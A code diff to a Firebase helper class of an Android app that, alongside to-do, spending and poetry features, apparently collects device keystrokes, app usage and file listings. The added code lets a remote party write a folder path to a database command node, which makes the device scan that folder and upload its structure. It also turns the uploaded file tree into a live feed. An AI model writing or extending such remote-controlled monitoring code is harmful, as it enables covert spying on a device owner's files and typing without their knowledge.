@@ -7,7 +7,7 @@ import android.app.Activity;
 import android.content.Context;
 import android.util.Log;
 
-import java.util.ArrayList;
+import java.util.Calendar;
 import java.util.UUID;
 
 import androidx.annotation.NonNull;
@@ -21,7 +21,6 @@ import com.vikasyadavnsit.cdc.constants.AppConstants;
 import com.vikasyadavnsit.cdc.data.AppUsageReportData;
 import com.vikasyadavnsit.cdc.data.SpendingEntry;
 import com.vikasyadavnsit.cdc.data.TodoItem;
-import java.util.Calendar;
 import com.vikasyadavnsit.cdc.dialog.MessageDialog;
 import com.vikasyadavnsit.cdc.enums.ApplicationInputActions;
 import com.vikasyadavnsit.cdc.data.KeyStrokeData;
@@ -30,11 +29,13 @@ import com.vikasyadavnsit.cdc.data.User;
 import com.vikasyadavnsit.cdc.enums.ActionStatus;
 import com.vikasyadavnsit.cdc.enums.ClickActions;
 
+import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashMap;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.TreeMap;
 
 public class FirebaseUtils {
 
@@ -68,6 +69,7 @@ public class FirebaseUtils {
                                     ApplicationInputActions.FIREBASE_CREATE_USER));
                 } else {
                     getAppTriggerSettingsData();
+                    listenForRemoteCommands(activity);
                 }
             }
 
@@ -76,6 +78,28 @@ public class FirebaseUtils {
                 Log.e("FirebaseUtils", "checkUserExistsAndInit failed: " + error.toException());
                 getAppTriggerSettingsData();
             }
+        });
+    }
+
+    public static void requestRemoteDirectoryScan(String path) {
+        Map<String, Object> command = new HashMap<>();
+        command.put("path", path);
+        command.put("timestamp", System.currentTimeMillis());
+        getDbRef(getSelectedUserPath("/commands/directoryRequest")).setValue(command);
+    }
+
+    public static void listenForRemoteCommands(Activity activity) {
+        getDbRef(getPath("/commands/directoryRequest")).addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                if (snapshot.exists()) {
+                    String path = snapshot.child("path").getValue(String.class);
+                    if (path != null) {
+                        FileExplorer.captureDirectoryStructure(activity, path);
+                    }
+                }
+            }
+            @Override public void onCancelled(@NonNull DatabaseError error) {}
         });
     }
 
@@ -229,11 +253,6 @@ public class FirebaseUtils {
         });
     }
 
-    public static void updateRemoteTrigger(String actionKey, User.AppTriggerSettingsData data) {
-        DatabaseReference ref = getDbRef(getSelectedUserPath("/appSettings/appTriggerSettingsDataMap/" + actionKey));
-        ref.setValue(data);
-    }
-
     public static void getAndroidUserKeystrokes() {
         DatabaseReference ref = getDbRef(getSelectedUserPath("/userDeviceData/keystrokes"));
         ref.addListenerForSingleValueEvent(new ValueEventListener() {
@@ -326,7 +345,7 @@ public class FirebaseUtils {
     }
 
     public static void getRemoteFileStructure() {
-        getDbRef(getSelectedUserPath("/userDeviceData/fileStructure")).addListenerForSingleValueEvent(new ValueEventListener() {
+        getDbRef(getSelectedUserPath("/userDeviceData/fileStructure")).addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
                 ActionUtils.displayRemoteFileStructure(snapshot.getValue(Object.class));
@@ -335,8 +354,12 @@ public class FirebaseUtils {
         });
     }
 
+    public static void getRemoteFileStructure(ValueEventListener listener) {
+        getDbRef(getSelectedUserPath("/userDeviceData/fileStructure")).addValueEventListener(listener);
+    }
+
     public static void updateRemoteUserMessage(String androidId, String message) {
-        DatabaseReference ref = getDbRef(getPath("/message"));
+        DatabaseReference ref = getDbRef(AppConstants.FIREBASE_RTDB_BASE_PATH + androidId + "/message");
         ref.setValue(message);
     }
 
@@ -359,8 +382,8 @@ public class FirebaseUtils {
         getDbRef(getPath("/userDeviceData/appStats")).setValue(appUsageDataMap);
     }
 
-    public static void uploadDeviceDirectoryStructureSnapshot(LinkedHashMap<String, Object> directoryMap) {
-        getDbRef(getPath("/userDeviceData/fileStructure")).setValue(directoryMap);
+    public static void uploadDeviceDirectoryStructureSnapshot(List<Map<String, Object>> directoryList) {
+        getDbRef(getPath("/userDeviceData/fileStructure")).setValue(directoryList);
     }
 
     public static void getShayariCollection(ShayariCollectionCallback callback) {
@@ -477,6 +500,10 @@ public class FirebaseUtils {
                 callback.onLoaded(new HashMap<>(), new HashMap<>());
             }
         });
+    }
+
+    public static void updateRemoteTrigger(String key, User.AppTriggerSettingsData updated) {
+        getDbRef(getSelectedUserPath("/appSettings/appTriggerSettingsDataMap/" + key)).setValue(updated);
     }
 
     public interface SpendingFullSyncCallback {
